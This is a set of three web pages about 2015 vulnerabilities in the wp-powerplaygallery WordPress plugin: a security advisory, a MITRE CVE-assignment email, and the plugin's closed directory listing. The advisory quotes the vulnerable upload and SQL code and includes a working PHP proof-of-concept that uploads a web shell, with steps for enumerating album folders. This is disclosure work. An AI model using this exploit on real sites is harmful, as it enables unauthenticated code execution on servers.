=== Content from www.vapid.dhs.org_d964a504_20250125_122957.html ===


| Advisory #: 132 |
| --- |
| **Title:** Remote file upload vulnerability & Blind SQLi in wordpress plugin wp-powerplaygallery v3.3 |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2015-06-27 |
| [[CVE-2015-5599](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5599)][[CVE-2015-5681](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5681)][[CVE-2015-5682](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5682)] |
| **Download Site:** <https://wordpress.org/plugins/wp-powerplaygallery> |
| **Vendor:** |
| **Vendor Notified:**  2015-06-29 |
| **Vendor Contact:** plugins@wordpress.org |
| **Advisory:** <http://www.vapid.dhs.org/advisory.php?v=132>http://www.vapid.dhs.org/advisory.php?v=132 |
| **Description:** This is the best gallery for touch screens. It is fully touch enabled with great features. This gallery is compatible wiht iphone and ipads. It is also allow us to use it as a widget.You can also enable this Powerplay Gallery on your wordpress site by placing code snippet in your template (.php) files. It shows flash gallery for desktops and touch enabled version for ipad and iphones. |
| **Vulnerability:**1. Ability to create directories out side of the upload path by using ../: Lines 56-59 of upload.php: 56 // Create target dir 57 if (!file\_exists($targetDir)) { 58 @mkdir($targetDir); 59 } 2. Arbitrary file uploads to a path in the web root directory: Lines 138-160 of uploads.php don’t verify what types of files are allowed or where they should be placed: 138 // Open temp file 139 if (!$out = @fopen("{$filePath}.part", $chunks ? "ab" : "wb")) { 140 die('{"jsonrpc" : "2.0", "error" : {"code": 102, "message": "Failed to open output stream."}, "id" : "id"}'); 141 } 142 143 if (!empty($\_FILES)) { 144 if ($\_FILES["file"]["error"] || !is\_uploaded\_file($\_FILES["file"]["tmp\_name"])) { 145 die('{"jsonrpc" : "2.0", "error" : {"code": 103, "message": "Failed to move uploaded file."} , "id" : "id"}'); 146 } 147 148 // Read binary input stream and append it to temp file 149 if (!$in = @fopen($\_FILES["file"]["tmp\_name"], "rb")) { 150 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}'); 151 } 152 } else { 153 if (!$in = @fopen("php://input", "rb")) { 154 die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}'); 155 } 156 } 157 158 while ($buff = fread($in, 4096)) { 159 fwrite($out, $buff); 160 } 3. Sql injection Lines 131-135 of upload.php fail to handle user input appropriately either by sanitizing or paramaterizing it. Injection points are any GET/POST to albumid or name. 131 $query = "INSERT INTO ".$wpdb->prefix."pp\_images (`category\_id`, `title`, `description`, `price`, `thumb`, ` image`, `status`, `order`, `creation\_date` ) 132 VALUES (".$\_REQUEST['albumid'].",'".$imgname[0]."','".$imgname[0]."','','".$resize."','".$\_REQUEST ['name']."',1,'','NULL')"; 133 134 $wpdb->query($query); 135 |
| **Export:** [JSON](export_json.py?id=) [TEXT](txt/.txt) [XML](xml.php?s=) |
| **Exploit Code:** ```   1. <?php 2. /*Remote shell upload exploit for wp-powerplaygallery v3.3 */ 3. /*Larry W. Cashdollar @_larry0 4. 6/27/2015 5. albumid needs to be a numeric value matching an existing album number, 1 is probably a good start 6. but you can enumerate these by using curl, and looking for redirect 301 responses: 7. e.g. $ curl http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big 8. ->301 exists else 404 doesn't. 9. shell is http://www.vapidlabs.com/wp-content/uploads/power_play/4_uploadfolder/big/shell.php 10. */ 13. $target_url = 'http://www.vapidlabs.com/wp-content/plugins/wp-powerplaygallery/upload.php'; 14. $file_name_with_full_path = '/var/www/shell.php'; 16. echo "POST to $target_url $file_name_with_full_path"; 17. $post = [array](http://www.php.net/array)('albumid'=>'foo' , 'name' => 'shell.php','file'=>'@'.$file_name_with_full_path); 19. $ch = [curl_init](http://www.php.net/curl_init)(); 20. [curl_setopt](http://www.php.net/curl_setopt)($ch, CURLOPT_URL,$target_url); 21. [curl_setopt](http://www.php.net/curl_setopt)($ch, CURLOPT_POST,1); 22. [curl_setopt](http://www.php.net/curl_setopt)($ch, CURLOPT_POSTFIELDS, $post); 23. [curl_setopt](http://www.php.net/curl_setopt)($ch, CURLOPT_RETURNTRANSFER,1); 24. $result=[curl_exec](http://www.php.net/curl_exec) ($ch); 25. [curl_close](http://www.php.net/curl_close) ($ch); 26. echo "<hr>"; 27. echo $result; 28. echo "<hr>"; 29. ?>  ``` |
| **Screen Shots:** |
| **Notes:** |



=== Content from www.openwall.com_918bc54a_20250125_122957.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](7) [[next>]](9) [[<thread-prev]](1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20150727153348.04ADB6FC064@smtpvmsrv1.mitre.org>
Date: Mon, 27 Jul 2015 11:33:48 -0400 (EDT)
From: cve-assign@...re.org
To: larry0@...com
Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
Subject: Re: Remote file upload vulnerability & SQLi in wordpress plugin wp-powerplaygallery v3.3

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

>> ... It seems that the essence
>> of the problem is that the product could reject unsafe file types such
>> as .php files, but doesn't do that. That can have one CVE ID.

> It should filter out what file types are allowed for uploading at least.

Use CVE-2015-5681 for the issue in which an executable file is not
blocked, and consequently an attacker has the ability to create and
execute arbitrary PHP code, such as at the
/wp-content/uploads/power_play/4_uploadfolder/big/shell.php URI in
your original example.

> The directory creation code in upload.php doesn't create the
> subdirectories big and thumb. These directories are added when a new
> album is created through normal use of the plugin.

Thanks for this additional information. In that case, we feel that it
is best to categorize the:

  // Create target dir
  if (!file_exists($targetDir)) {
          @mkdir($targetDir);
  }

code block as, more or less, an authorization bypass. The user of
upload.php has no legitimate need to create a $targetDir directory,
because this directory is usable only if previously created by a
power_play.php code block of:

        if( !is_dir( $album_dir ) )
                mkdir($album_dir);
        if( !is_dir($album_dir . '/big') )
                mkdir($album_dir . '/big');
        if( !is_dir($album_dir . '/thumb') )
                mkdir($album_dir . '/thumb');

The user of upload.php can choose to use directory traversal (as you
mentioned) or can simply create a huge number of directories with (for
example) numeric or alphanumeric $_REQUEST['albumid'] values.
Directory traversal is not an independent primary vulnerability and
cannot have its own separate CVE ID.

Use CVE-2015-5682 for the issue of a superfluous "@mkdir($targetDir);"
line that allows attackers to create arbitrarily many useless
directories via a series of requests.

>> Are you also reporting any authorization problem? Is upload.php
>> responsible for verifying that the client user has the upload_files
>> capability, regardless of what file type is being uploaded?

> I know I wouldn't want arbitrary images uploaded to my Wordpress
> instance from users who aren't logged in.

This was a somewhat philosophical question about WordPress security.
There are no more CVE ID assignments below, but here are our comments
in case anyone is interested.

As far as we can tell, there is no expectation that the author of a
plugin must determine whether the plugin offers a feature associated
with the concept of "uploading files" and, if so, make that feature
available only to users who have the upload_files capability. In some
cases, this would be a good idea for aligning the plugin's behavior
with user expectations, or for making the plugin's authorization model
easy to understand. However, a plugin may have a good reason to do
something entirely different. For example, if there are many people
who need to do exactly one upload and will never interact with that
WordPress installation again, it might be simpler to have an upload
password.

WordPress apparently supports the behavior of some plugins with:

  wp-admin/media-new.php

  /**
   * Manage media uploaded file.
   *
   * There are many filters in here for media. Plugins can extend functionality
   * by hooking into the filters.
  ...
   if (!current_user_can('upload_files'))
           wp_die(__('You do not have permission to upload files.'));

The current case is, essentially, that an unauthenticated attacker can
send a request to upload.php and place non-executable content at the
URI:

  /wp-content/uploads/power_play/4_uploadfolder/big/not-a-shell.jpg

Your comment was "I know I wouldn't want arbitrary images uploaded,"
which doesn't directly answer the question of whether this is a
reported vulnerability or not. Our current feeling is that we will not
universally categorize this as a vulnerability unless there is
confirming feedback from the author. We didn't find anything at
either:

  [https://web.archive.org/web/20150503133237/https://wordpress.org/plugins/wp-powerplaygallery/](https://web.archive.org/web/20150503133237/https%3A//wordpress.org/plugins/wp-powerplaygallery/)
  <http://wpslideshow.com/powerplay-gallery/>

documenting that the upload process should be authenticated or that
uploaded files should be initially inaccessible. There are obviously
very good reasons to prevent an unauthenticated upload of a JPG file
to an accessible and predictable URL; however, there might sometimes
be a tradeoff with usability and the WordPress installation might want
to deploy the plugin anyway until abuse is actually observed. We also
realize that, for any specific example in which this is occurring,
there is probably a possible design improvement that preserves nearly
all usability and makes abuse much more difficult. Still, our decision
for now is that there's no CVE ID associated with creating
/wp-content/uploads/power_play/4_uploadfolder/big/not-a-shell.jpg in
the above example.

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (SunOS)

iQEcBAEBAgAGBQJVtk5cAAoJEKllVAevmvmswL4H/1jFeB0Dr3s+KqtbJX+xTvzP
LvTFb9m4gG5OGfzqUVWeQPnjURgWw7Hz7Qcdj3WIo3SpsmOkq89RgaQFSWKsYxAp
BzedA08ztTzEaaVSGHHN/7TgXe05xuVpYPzyO2D4SRmXU7LRCSDg/lpi5SHCTcJY
GMW5inwiB1LiJhsQ+c3CsY5iD+HjSTk7t640wHuMY5aIRfcbdd5utVfR9PUlfafg
Wyu7jJhNmqGOSKe4lXa9jwtjND31SQcCIgLe5HnI/E1fOpIzaHh/oS0yLcRID/nM
mWeHDCoXHeF4seHFXNHg4pSl/BOVxJqBWQKz6ZVklqIf4ryLQ2dWxAITZ2NuTwQ=
=KocW
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from wordpress.org_4b66b261_20250126_083037.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Plugin Directory](https://wordpress.org/plugins/)

Powerplay Gallery

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fwp-powerplaygallery&locale=en_US)

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fwp-powerplaygallery&locale=en_US)

Search plugins

![](https://s.w.org/plugins/geopattern-icon/wp-powerplaygallery_899196.svg)
# wp-powerplaygallery

By [WP Slideshow](http://wpslideshow.com)

* [Details](https://wordpress.org/plugins/wp-powerplaygallery/#description)
* [Reviews](https://wordpress.org/plugins/wp-powerplaygallery/#reviews)
* [Development](https://wordpress.org/plugins/wp-powerplaygallery/#developers)

[Support](https://wordpress.org/support/plugin/wp-powerplaygallery/)

## Description

This plugin has been closed as of September 2, 2014 and is not available for download. Reason: Unknown.

## Reviews

There are no reviews for this plugin.

## Contributors & Developers

“Powerplay Gallery” is open source software. The following people have contributed to this plugin.

Contributors

* ![](https://secure.gravatar.com/avatar/b1f7e87d97783fbfb7a040c8c81532db761c1efe910cb24e26c8075e0adcf946?s=32&d=mm&r=g)

[Translate “Powerplay Gallery” into your language.](https://translate.wordpress.org/projects/wp-plugins/wp-powerplaygallery)

### Interested in development?

[Browse the code](https://plugins.trac.wordpress.org/browser/wp-powerplaygallery/), check out the [SVN repository](https://plugins.svn.wordpress.org/wp-powerplaygallery/), or subscribe to the [development log](https://plugins.trac.wordpress.org/log/wp-powerplaygallery/) by [RSS](https://plugins.trac.wordpress.org/log/wp-powerplaygallery/?limit=100&mode=stop_on_copy&format=rss).

## Meta

* Version **3.3**
* Last updated **10 years ago**
* Active installations **N/A**
* WordPress version **3.0 or higher**
* Tested up to **3.3.2**
* [Advanced View](https://wordpress.org/plugins/wp-powerplaygallery/advanced/)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


